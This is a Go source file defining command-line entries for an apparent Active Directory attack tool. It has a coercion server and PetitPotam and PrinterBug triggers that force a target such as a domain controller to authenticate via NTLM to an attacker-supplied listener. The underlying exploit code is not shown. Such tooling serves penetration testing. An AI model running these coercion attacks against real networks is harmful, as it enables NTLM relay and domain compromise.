// cmd/adgo/commands/coercion.go
package commands

import (
	"adgo/pkg/coercion"
	"fmt"

	"adgo/pkg/common"

	"github.com/spf13/cobra"
)

// CoercionCmd démarre un serveur de coercion NTLM.
var CoercionCmd = &cobra.Command{
	Use:   "coercion",
	Short: "NTLM coercion operations",
	RunE: func(cmd *cobra.Command, args []string) error {
		addr, _ := cmd.Flags().GetString("addr")
		cs := coercion.NewCoerceServer(addr)
		fmt.Printf("Starting NTLM coercion server on %s\n", addr)
		return cs.Start()
	},
}

// PetitPotamCmd déclenche PetitPotam depuis la cible vers un listener
var PetitPotamCmd = &cobra.Command{
	Use:     "petitpotam",
	Short:   "Trigger PetitPotam coercion (MS-EFSRPC) to force NTLM auth",
	Example: `adgo coercion petitpotam --target dc01.lab.local --listener 192.168.1.100:8443`,
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		listener, _ := cmd.Flags().GetString("listener")

		if target == "" || listener == "" {
			return fmt.Errorf("--target and --listener are required")
		}

		common.PrintInfo(fmt.Sprintf("Triggering PetitPotam coercion: %s -> %s", target, listener))

		err := coercion.TriggerPetitPotam(target, listener)
		if err != nil {
			common.PrintError(err)
			return err
		}

		common.PrintSuccess("PetitPotam coercion triggered successfully")
		return nil
	},
}

var PrinterBugCmd = &cobra.Command{
	Use:   "printerbug",
	Short: "Trigger PrinterBug coercion (MS-RPRN) to force NTLM auth from target",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		listener, _ := cmd.Flags().GetString("listener")

		if target == "" || listener == "" {
			return fmt.Errorf("--target and --listener are required")
		}

		common.PrintInfo(fmt.Sprintf("Triggering PrinterBug coercion: %s -> %s", target, listener))

		err := coercion.TriggerPrinterBug(target, listener)
		if err != nil {
			common.PrintError(err)
			return err
		}

		common.PrintSuccess("PrinterBug coercion triggered successfully")
		return nil
	},
}

func init() {
	CoercionCmd.Flags().String("addr", ":8080", "Address to listen on (for server mode)")

	PetitPotamCmd.Flags().String("target", "", "Target IP or hostname (e.g. dc01.lab.local)")
	PetitPotamCmd.Flags().String("listener", "", "Your listener IP:port (e.g. 192.168.1.100:8443)")

	PetitPotamCmd.MarkFlagRequired("target")
	PetitPotamCmd.MarkFlagRequired("listener")

	CoercionCmd.AddCommand(PetitPotamCmd)

	// Flags pour PrinterBug (identiques à PetitPotam)
	PrinterBugCmd.Flags().String("target", "", "Target IP or hostname (e.g. dc01.lab.local)")
	PrinterBugCmd.Flags().String("listener", "", "Your listener IP:port (e.g. 192.168.1.100:8443)")

	PrinterBugCmd.MarkFlagRequired("target")
	PrinterBugCmd.MarkFlagRequired("listener")

	CoercionCmd.AddCommand(PrinterBugCmd)
}
